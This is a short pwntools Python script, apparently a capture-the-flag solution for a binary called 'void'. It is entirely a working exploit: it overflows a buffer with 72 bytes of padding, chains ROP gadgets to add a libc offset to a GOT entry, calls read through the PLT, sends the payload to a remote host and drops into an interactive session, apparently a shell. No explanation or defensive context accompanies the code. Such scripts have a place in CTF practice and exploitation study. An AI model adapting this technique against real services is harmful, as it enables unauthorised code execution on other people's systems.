from pwn import *

#r = gdb.debug('./void', gdbscript='b *0x000000000040113b')
#r = process('./void')
r = remote('ip',port)

#elf = ELF('./void')
#libc = ELF('./libc.so.6')

ret = p64(0x0401016)
pop_rdi = p64(0x04011bb)
read_plt = p64(0x0401030)
main = p64(0x00401143)
add = p64(0x0401108) #add dword ptr [rbp - 0x3d], ebx
rbp = p64(0x0401109)
rbx = p64(0x04011b2)

#print(elf.got)
a = p64(4210712+61)
padding = b'A'*72
offset = 0xffffffffffffffff+1-0x23166
#print(offset)
offset = p64(offset)

#print('A'*84)

payload = padding + rbx + offset + a + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00) + add + read_plt
print(str(payload))

r.sendline(payload)

r.interactive()
